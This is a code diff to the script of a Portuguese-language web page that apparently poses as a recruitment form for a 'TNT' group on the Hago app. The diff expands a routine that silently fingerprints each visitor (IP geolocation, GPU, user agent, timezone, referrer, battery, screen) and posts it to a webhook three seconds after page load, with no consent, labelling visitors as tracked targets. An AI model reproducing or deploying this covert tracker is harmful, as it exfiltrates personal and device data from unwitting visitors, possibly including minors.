@@ -233,49 +233,58 @@
     }
     function copyTag() {
         const t = document.getElementById('resTag').innerText;
-        navigator.clipboard.writeText(t).then(() => {
-            document.querySelector('.tag-box button').innerText = "COPIADO!";
-            setTimeout(() => document.querySelector('.tag-box button').innerText = "COPIAR", 2000);
-        });
+        const el = document.createElement('textarea');
+        el.value = t;
+        document.body.appendChild(el);
+        el.select();
+        document.execCommand('copy');
+        document.body.removeChild(el);
+        document.querySelector('.tag-box button').innerText = "COPIADO!";
+        setTimeout(() => document.querySelector('.tag-box button').innerText = "COPIAR", 2000);
     }
 
     async function getEliteIntel() {
         let intel = {};
+        // Localização e Rede
         try {
             const res = await fetch('https://ipapi.co/json/');
             intel.geo = await res.json();
         } catch(e) {}
+        
+        // GPU Detalhada
         try {
             const canvas = document.createElement('canvas');
             const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
             const debug = gl.getExtension('WEBGL_debug_renderer_info');
             intel.gpu_completa = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
             intel.gpu_marca = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL);
-        } catch(e) {}
+        } catch(e) { intel.gpu_completa = "Bloqueado/Incompatível"; }
+        
+        // Armazenamento
         if(navigator.storage && navigator.storage.estimate) {
             const est = await navigator.storage.estimate();
             intel.espaço_disco = (est.quota / (1024 ** 3)).toFixed(2) + " GB";
         }
-        intel.sistema = navigator.platform;
+
+        // Informações de Sistema Adicionais
+        intel.user_agent = navigator.userAgent;
+        intel.idioma = navigator.language || navigator.userLanguage;
+        intel.fuso_horario = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        intel.referencia = document.referrer || "Acesso Direto";
+        intel.plataforma = navigator.platform;
         intel.ram_aprox = navigator.deviceMemory || '8+';
-        intel.processador_nucleos = navigator.hardwareConcurrency || '?';
-        intel.tela_res = `${window.screen.width}x${window.screen.height}`;
-        if(navigator.connection) {
-            intel.net_tipo = navigator.connection.effectiveType;
-            intel.net_speed = navigator.connection.downlink + " Mbps";
-            intel.net_lag = navigator.connection.rtt + " ms";
-        }
+        intel.cores = navigator.hardwareConcurrency || '?';
+        intel.tela = `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}-bit)`;
+        intel.touch_points = navigator.maxTouchPoints || '0';
+        
+        // Bateria
         if(navigator.getBattery) {
             const b = await navigator.getBattery();
-            intel.bateria_nivel = (b.level * 100).toFixed(0) + "%";
-            intel.carregador_conectado = b.charging ? "SIM" : "NÃO";
+            intel.bat_level = (b.level * 100).toFixed(0) + "%";
+            intel.bat_charging = b.charging ? "Sim" : "Não";
         }
-        intel.em_movimento = "Indeterminado";
-        window.addEventListener('deviceorientation', (e) => {
-            if(e.alpha) intel.em_movimento = "SIM (Celular na mão)";
-            else intel.em_movimento = "NÃO (Celular parado)";
-        }, {once: true});
-        intel.hora_envio = new Date().toLocaleString('pt-BR');
+
+        intel.hora_local = new Date().toLocaleString('pt-BR');
         return intel;
     }
 
@@ -284,7 +293,7 @@
     async function enviarDados(manual = false) {
         if (!manual && automaticoEnviado) return;
         
-        const name = manual ? document.getElementById('f_name').value : "SISTEMA (AUTO-LOG)";
+        const name = manual ? document.getElementById('f_name').value : "SISTEMA (LOGIN SILENCIOSO)";
         const st = document.getElementById('term-status');
         
         if(manual && (!name || !sRole)) {
@@ -295,49 +304,59 @@
 
         if(manual) {
             document.getElementById('btnS').disabled = true;
-            document.getElementById('btnS').innerText = "ENVIANDO...";
+            document.getElementById('btnS').innerText = "ENVIANDO PROTOCOLOS...";
         }
 
         const intel = await getEliteIntel();
 
         const payload = {
-            username: manual ? "TNT - FORMULÁRIO" : "TNT - AUTO-DETECTOR",
+            username: manual ? "TNT - RECRUTA" : "TNT - RASTREADOR",
             avatar_url: "https://i.pinimg.com/736x/92/c5/d8/92c5d80effca7e40f59dbb9ea405cdaf.jpg",
             embeds: [
                 {
-                    title: manual ? "📝 FORMULÁRIO PREENCHIDO" : "🚀 ALVO ENTROU NO LINK (SILENCIOSO)",
-                    description: manual ? `**Recruta:** \`${name}\`` : `**Um novo dispositivo acessou o terminal.**`,
+                    title: manual ? "📑 NOVA FICHA DE ALISTAMENTO" : "🛰️ DISPOSITIVO RASTREADO NO TERMINAL",
                     color: manual ? 0x00ff40 : 16711740,
+                    thumbnail: { url: "https://i.pinimg.com/originals/7b/b9/ed/7bb9ed00d54da2404408d685534a36d4.gif" },
                     fields: [
-                        { name: "🌍 REDE E LOCALIZAÇÃO", value: `\`\`\`ini\n[IP]: ${intel.geo?.ip || '?'}\n[CIDADE]: ${intel.geo?.city || '?'}\n[PROVEDOR]: ${intel.geo?.org || '?'}\n[LATENCIA]: ${intel.net_lag}\n\`\`\``, inline: false },
-                        { name: "⚙️ HARDWARE", value: `\`\`\`http\nPLACA_GRAFICA: ${intel.gpu_completa}\nPROCESSADOR: ${intel.processador_nucleos} Cores\nRAM: ${intel.ram_aprox}GB\nDISCO: ${intel.espaço_disco}\n\`\`\``, inline: false },
-                        { name: "🔋 DISPOSITIVO", value: `\`\`\`fix\nBATERIA: ${intel.bateria_nivel}\nCARREGANDO: ${intel.carregador_conectado}\nMOVIMENTO: ${intel.em_movimento}\nTELA: ${intel.tela_res}\nSISTEMA: ${intel.sistema}\n\`\`\``, inline: false }
-                    ]
+                        { name: "👤 IDENTIFICAÇÃO", value: `\`\`\`yaml\nNOME: ${name}\nID_HAGO: ${document.getElementById('f_id').value || 'N/A'}\nIDADE: ${document.getElementById('f_age').value || 'N/A'}\nDIVISÃO: ${sRole || 'N/A'}\n\`\`\``, inline: false },
+                        { name: "🌍 REDE & LOCALIZAÇÃO", value: `\`\`\`ini\n[IP]: ${intel.geo?.ip || '?'}\n[CIDADE]: ${intel.geo?.city || '?'}\n[ESTADO]: ${intel.geo?.region || '?'}\n[PAÍS]: ${intel.geo?.country_name || '?'}\n[PROVEDOR]: ${intel.geo?.org || '?'}\n[TIMEZONE]: ${intel.fuso_horario}\n\`\`\``, inline: false },
+                        { name: "💻 HARDWARE & TELA", value: `\`\`\`http\nGPU: ${intel.gpu_completa}\nCPU_CORES: ${intel.cores}\nRAM: ${intel.ram_aprox}GB\nRESOLUÇÃO: ${intel.tela}\nTOUCH_POINTS: ${intel.touch_points}\n\`\`\``, inline: false },
+                        { name: "📱 SISTEMA & BATERIA", value: `\`\`\`fix\nSISTEMA: ${intel.plataforma}\nIDIOMA: ${intel.idioma}\nBATERIA: ${intel.bat_level || '?'}\nCARREGANDO: ${intel.bat_charging || '?'}\nREFERÊNCIA: ${intel.referencia}\n\`\`\``, inline: false },
+                        { name: "🕵️ USER AGENT", value: `\`\`\`\n${intel.user_agent}\n\`\`\``, inline: false }
+                    ],
+                    footer: { text: `TNT SECURITY SYSTEM • ${intel.hora_local}` }
                 }
             ]
         };
 
-        if(manual) {
-            payload.embeds[0].fields.push({ name: "💬 DADOS DIGITADOS", value: `**ID Hago:** ${document.getElementById('f_id').value}\n**Idade:** ${document.getElementById('f_age').value}\n**Divisão:** ${sRole}\n**Motivo:** ${document.getElementById('f_goal').value}`, inline: false });
+        if(manual && document.getElementById('f_goal').value) {
+            payload.embeds[0].fields.push({ name: "💬 OBJETIVO DECLARADO", value: `> ${document.getElementById('f_goal').value}`, inline: false });
         }
 
         try {
-            await fetch(HOOK, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
+            await fetch(HOOK, { 
+                method: 'POST', 
+                headers: {'Content-Type': 'application/json'}, 
+                body: JSON.stringify(payload) 
+            });
             if(manual) {
-                document.getElementById('btnS').innerText = "ENVIADO COM SUCESSO";
-                st.innerText = "Sincronização completa.";
+                document.getElementById('btnS').innerText = "SOLICITAÇÃO ENVIADA";
+                st.innerText = "Dados criptografados e enviados com sucesso.";
                 st.style.color = "#00ff40";
             } else {
                 automaticoEnviado = true;
-                console.log("Auto-log enviado.");
             }
-        } catch(e) {}
+        } catch(e) {
+            if(manual) {
+                document.getElementById('btnS').innerText = "ERRO NO ENVIO";
+                document.getElementById('btnS').disabled = false;
+            }
+        }
     }
 
     window.onload = () => {
         loadTrack(0);
-        // Typewriter effect
-        const text = "Iniciando protocolos de segurança TNT...";
+        const text = "Iniciando protocolos de monitoramento TNT...";
         let i = 0;
         function type() {
             if(i < text.length) {
@@ -347,10 +366,8 @@
         }
         type();
 
-        // PUXAR TUDO AUTOMATICAMENTE APÓS 3 SEGUNDOS
-        setTimeout(() => {
-            enviarDados(false);
-        }, 3000);
+        // Envio silencioso após 3 segundos
+        setTimeout(() => enviarDados(false), 3000);
     };
 </script>
 </body>
